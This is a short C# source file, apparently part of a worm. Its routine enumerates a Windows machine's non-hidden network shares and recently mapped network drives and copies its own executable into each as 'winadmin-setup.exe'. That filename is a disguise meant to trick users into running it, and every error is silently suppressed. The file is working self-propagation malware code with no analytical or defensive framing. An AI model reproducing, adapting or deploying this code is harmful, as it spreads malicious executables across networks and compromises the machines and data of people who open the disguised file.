using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Management;

namespace myApp
{
    class Yeha {

        private string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);

        public static void go()
        {
            Yeha yeha = new Yeha();
            yeha.Share();
            
        }

        public void Share() {

            try {
                ManagementObjectSearcher shares = new
                    ManagementObjectSearcher("select * from win32_share");
                foreach (ManagementObject serv in shares.Get()) {
                    string shareName = Convert.ToString(serv["Name"]);
                    if (!shareName.Contains("$")) {
                        File.Copy(me, @"\\" + Environment.MachineName + @"\" + shareName + @"\winadmin-setup.exe", true);
                    }
                }
            } catch (Exception) { }


            try {
                string key = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU\";
                RegistryKey reg = Registry.CurrentUser.OpenSubKey(key); ;
                foreach (string valuename in reg.GetValueNames()) {
                    string path = reg.GetValue(valuename).ToString();
                    if (valuename.ToLower() != "mrulist") {
                        try {
                            File.Copy(me, path + @"\\winadmin-setup.exe", true);
                        } catch (Exception) {
                            continue;
                        }
                    }
                }
                reg.Close();
            } catch (Exception) { }
        }


    }
}